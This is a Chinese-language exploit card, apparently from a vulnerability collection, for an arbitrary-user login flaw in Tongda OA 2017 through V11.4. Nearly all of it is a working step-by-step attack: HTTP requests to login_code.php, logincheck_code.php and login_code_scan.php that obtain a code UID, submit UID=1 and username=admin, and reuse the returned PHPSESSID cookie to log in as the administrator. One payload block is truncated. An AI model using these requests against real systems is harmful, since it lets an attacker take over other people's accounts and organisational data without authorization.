# 通达OA前台任意用户登录漏洞

- **系统**：通达OA　|　**类型**：其他　|　**CVE**：—
- **请求**：`POST /logincheck_code.php HTTP/1.1`
- **关键头**：`Host: xxx.xxx.xxx.xxx`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 0`

**请求体 / payload**
```
CODEUID={546DF670-FBDB-251D-D4AA-CD5C6C976592}&UID=1
/general/index.php?is_modify_pwd=1
使用上一步获取到的cookie中的PHPSESSID字段替换cookie进行登录
Host: xxx.xxx.xxx.xxx
Cookie: PHPSESSID=afni33n5if6hi6s26i3b2h79j3;
/general/login_code_scan.php
post请求：codeuid={8E41DD10-C3C3-A664-2249-2A2B2DF23619}&source=pc&uid=1&type=confirm&username=admin
用上一步获取的codeuid进行替换，当响应status为1时，代表验证成功。
Host: xxx.xxx.xxx.xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
codeuid={8E41DD10-C3C3-A664-2249-2A2B2DF23619}&source=pc&uid=1&type=confirm&username=admin
利用上一步获取的cookie替换，登录应用系统
Host: {hostname}
Cookie: PHPSESS…（脚本共 632 字，完整版见原文）
```

**其他**
- 通达OA前台任意用户登录漏洞: + 【漏洞简介】
+ 【影响版本】
+ 【漏洞复现】
    - 第一种利用方法
        * 1. 获取code_uid
        * 2. 获取cookie
        * [3. 利用获取到的cookie登录系统](#3-%E5%88%A9%E7%94%A8%E8%8
- 版本: + 通达OA 2017-通达OA V11.4
- 1. 获取code_uid: ```java
get请求获取codeuid
payload:
/general/login_code.php
/ispirit/login_code.php
```
- 2. 获取cookie: ```java
/logincheck_code.php
post请求提交 "CODEUID={code_uid}&UID=1"，获取cookie
```
- 1. 获取codeuid: ```java
/ispirit/login_code.php
```
- 3. 获取cookie: ```java
/ispirit/login_code_check.php?codeuid={EED2B9FE-F865-DCF1-0E8D-3326AE163F6D}
使用上一步验证过的codeui进行替换，获取cookie
```